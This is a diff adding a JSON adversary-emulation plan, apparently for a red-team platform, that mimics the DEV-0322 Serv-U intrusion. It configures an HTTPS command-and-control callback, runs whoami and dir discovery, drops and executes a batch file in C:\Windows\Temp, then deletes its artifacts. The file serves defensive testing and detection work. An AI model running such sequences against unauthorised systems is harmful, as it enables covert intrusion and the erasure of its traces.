@@ -1,0 +1,100 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "This threat is based on Microsoft Threat Intelligence Center (MSTIC) report post on July 13, 2021: https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/",
+        "display_name": "DEV-0322",
+        "name": "DEV-0322",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"192.168.2.50:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c whoami > whoami.txt",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c dir > dir.txt",
+                "rtags": [
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c echo whoami > C:\\Windows\\Temp\\Serv-U.bat",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c \"C:\\Windows\\Temp\\Serv-U.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe \"C:\\Windows\\Temp\\Serv-U.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del whoami.txt",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del dir.txt",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del \"C:\\Windows\\Temp\\Serv-U.bat\"",
+                "type": "message"
+            },
+            "10": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
